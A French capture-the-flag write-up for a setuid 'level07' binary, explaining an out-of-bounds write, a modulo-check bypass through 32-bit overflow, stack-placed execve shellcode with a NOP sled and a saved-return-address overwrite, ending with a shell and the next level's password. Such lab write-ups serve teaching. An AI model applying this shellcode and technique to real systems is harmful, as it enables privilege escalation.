# Level07

### Repérage

```
ls -la
-rwsr-s---+ 1 level08 users ... level07
```

Bit setuid + propriétaire level08, donc le binaire tourne avec les droits de level08. Si on obtient un shell, il sera en level08.

Le programme est un "service de stockage de nombres" avec 3 commandes :
- `store` : écrit un nombre (4 octets) à un index donné (offset = index * 4)
- `read`  : relit le nombre stocké à un index donné
- `quit`  : quitte

### Analyse Ghidra

Les données sont stockées dans `local_1bc[100]` (tableau de 100 uint sur la stack de main).

```
store_number(data) :
    Number: uVar1 = get_unum();   // valeur a écrire
    Index:  uVar2 = get_unum();   // ou l'écrire
    if ((uVar2 % 3 == 0) || (uVar1 >> 0x18 == 0xb7)) {
        // ERROR: index réservé pour "wil"
    } else {
        *(uint *)(uVar2 * 4 + data) = uVar1;   // write sans vérif sur l'index (pas de size check)
    }

read_number(data) :
    Index: iVar1 = get_unum();
    printf(" Number at data[%u] is %u\n", iVar1, *(data + iVar1*4));  // read sans vérif sur l'index
```

### La faille

Aucune vérification de taille sur l'index. On peut donc écrire 4 octets n'importe où par rapport à `data` : c'est un write-what-where.
- quoi = Number (la valeur)
- ou   = data + index * 4 (*4 pour passer au prochain elem on est sur des uint de 4 octets)

Comme `data` est sur la stack, on peut écrire au-delà du tableau, jusqu'à la saved adresse de retour de main. `read` sert à sonder la mémoire pour valider les offsets.

Le plan :
1. écrire notre shellcode dans le buffer data (index 0, 1, 2...)
2. écraser l'adresse de retour de main par l'adresse du buffer
3. quand main fait `ret` (au quit), il saute sur notre shellcode -> shell level08

### Deux garde-fous

- `uVar2 % 3 == 0` : l'index saisi ne doit pas être multiple de 3.
- `uVar1 >> 0x18 == 0xb7` : l'octet de poids fort de la valeur ne doit pas valoir 0xb7 (ca bloque les adresses 0xb7..., typiquement la libc).

### Point clé : l'environnement est effacé

Dans un autre level, on mettait le shellcode dans une variable d'env. Ici on ne peut pas, car au début de main, deux boucles memset zéro-remplissent argv ET envp.

```
for (; *local_1c4 != 0; ...) memset((void *)*local_1c4, 0, ...);  // efface argv
for (; *local_1c8 != 0; ...) memset((void *)*local_1c8, 0, ...);  // efface envp
```

Conséquence : le shellcode ne peut pas être dans l'env, il serait effacé. On le met donc DANS le buffer data lui-même, via des store successifs.

### Contournement du check % 3

Le programme fait deux choses avec l'index :
- il check `index % 3 == 0` (et refuse si c'est le cas)
- il utilise `index * 4` comme offset d'écriture

L'idée : le check et l'offset regardent l'index différemment, on exploite cet écart.

L'index est un uint 32 bits. Si on ajoute 0x40000000 à l'index :
```
0x40000000 * 4 = 0x100000000
```
0x100000000 ne rentre pas dans 32 bits -> il déborde et le bit en trop est jeté ->
il reste 0. Donc ajouter 0x40000000 à l'index NE CHANGE PAS l'offset final (index*4).

Par contre pour le check `% 3`, ca change tout car :
```
0x40000000 % 3 = 1
```
Donc saisir `index + N*0x40000000` :
- garde le même offset d'écriture (grace au débordement du *4)
- mais décale le modulo de +N : le check voit `(index + N) % 3` au lieu de `index % 3`

Il suffit de choisir N dans {0, 1, 2} pour que `(index + N) % 3 != 0`.

Petit piège dans lequel je suis tombé :
au début j'ajoutais 0x40000000 A TOUS les index (N=1 partout). Mais comme 0x40000000 % 3 = 1, ca transforme les index "reel % 3 == 2" en multiples de 3. Donc Un index sur trois échouait avec "reserved for wil".

La bonne méthode : N dépend de l'index. On ajout 0x40000000 seulement sur les modulo de 3.
```
index reel 0  (0%3=0, bloqué) -> N=1 -> saisir 0 + 0x40000000 = 1073741824  (%3=1, OK)
index reel 1  (1%3=1, OK)     -> N=0 -> saisir 1                             (%3=1, OK)
index reel 2  (2%3=2, OK)     -> N=0 -> saisir 2                             (%3=2, OK)
index reel 3  (3%3=0, bloqué) -> N=1 -> saisir 3 + 0x40000000 = 1073741827  (%3=1, OK)
...
```
En clair : si l'index réel n'est pas multiple de 3, on le saisit tel quel. S'il l'est, on ajoute 0x40000000 pour esquiver le check.

### Le shellcode

execve /bin/sh (21 octets) avec un sled de NOP devant. Le sled sert à absorber l'imprécision sur l'adresse du buffer (même logique qu'au level05) : on vise dans le tapis de NOP, le CPU glisse jusqu'au vrai shellcode.

```
sled : 160 octets de \x90 (NOP)
code : \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

### Transformer le shellcode en commandes store

`store` écrit 4 octets à la fois, sous forme d'un nombre décimal (scanf %u).
Il faut donc découper le shellcode en blocs de 4 octets, et convertir chaque bloc en son entier little-endian (octets à l'envers).

Exemple 1 - un bloc de NOP : octets `90 90 90 90`
```
little-endian -> 0x90909090 -> en décimal : 2425393296
```
-> commande :
```
store
2425393296
<index>
```

Exemple 2 - début du vrai shellcode : octets `6a 0b 58 99`
```
octets lus a l'envers (little-endian) = 0x99 0x58 0x0b 0x6a = 0x99580b6a
0x99580b6a en décimal = 2572684138
```
-> commande :
```
store
2572684138
<index>
```

On répète pour tous les blocs (index 0, 1, 2, ...), en appliquant le contournement %3 sur l'index à chaque fois. On termine par la ligne qui écrase l'adresse de retour, puis `quit`.

Toutes les entrées sont dans le fichier cmd_level07.txt


### Trouver l'index de la saved EIP

Ce qu'on cherche : la saved EIP, c'est l'adresse de retour de main, celle vers laquelle le CPU saute quand main fait `ret` (donc quand on tape quit). Si on arrive à écrire dessus, `quit` ne quittera plus : il sautera où on veut. Reste à savoir à quel index elle se trouve par rapport au début du buffer.

On sait écrire à `data + index*4` donc :
```
index = (adresse_saved_EIP - data) / 4
```

Il faut ces deux adresses. On les déduit du prologue de main `disas main` :

```
+6   push %ebp
+3.. push %edi / %esi / %ebx  ->  4 registres poussés au total avec ebp
+9   and  $0xfffffff0,%esp    ->  alignement 16 -> retire un nb variable d'octets
+9   sub  $0x1d0,%esp         ->  réserve 0x1d0 = 464 octets de frame
...
+448 lea  0x24(%esp),%eax     ->  data = esp + 0x24  (36)  -> passé à store_number
```

- `data` est à esp + 0x24, soit 36 octets au-dessus du bas de la frame.
- La saved EIP est tout en haut de la frame, au-dessus des registres sauvés.

Estimation de la distance :
```
(taille_frame - offset_buffer + registres_poussés + alignement) / 4
(   464          -     36     +      16           +   12      ) / 4 = 114
```

Mais le and $0xfffffff0 retire un nombre d'octets qui dépend de la valeur d'esp au lancement, donc de l'environnement. Le "12" est une supposition. Autrement dit, 114 est une estimation, pas une certitude, il faut la vérifier.

### Confirmer l'index par sondage
Plutôt que de faire confiance au calcul, on teste. La commande `read` sert exactement à ça : sonder la mémoire. Et le comportement au quit nous dit si on a touché la saved EIP.

Test : on écrit une valeur reconnaissable (45) à l'index candidat, on la relit pour vérifier qu'on écrit bien là où on croit, puis on quitte.

```
./level07
Input command: store
 Number: 45
 Index: 1073741938 // = 0x40000000 + 114
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 45 // on relit bien 45 -> l'index vise la bonne case
Input command: quit
Segmentation fault (core dumped)
```

Le segfault au quit est la preuve recherchée : le ret de main a sauté sur 45 (une adresse invalide) au lieu de retourner normalement. Donc l'index 114 tombe bien sur la saved EIP. L'estimation était correct, et elle est maintenant confirmée.

Si au lieu du segfault le programme s'était terminé proprement, ça aurait voulu dire que 114 ne visait pas la saved EIP -> on aurait balayé les index voisins (113, 115, 116…) jusqu'à obtenir le segfault.

À partir de là, il suffit de remplacer 45 par l'adresse de notre buffer : le ret sautera sur le shellcode au lieu de crasher.

### Injection finale

Le `-` après le fichier est ESSENTIEL : il garde stdin ouvert après le fichier. Sinon le shell obtenu reçoit tout de suite EOF et meurt sans qu'on puisse taper.

```
cat cmd_level07.txt - | ./level07
...
Input command:  Number:  Index:  Completed store command successfully
whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
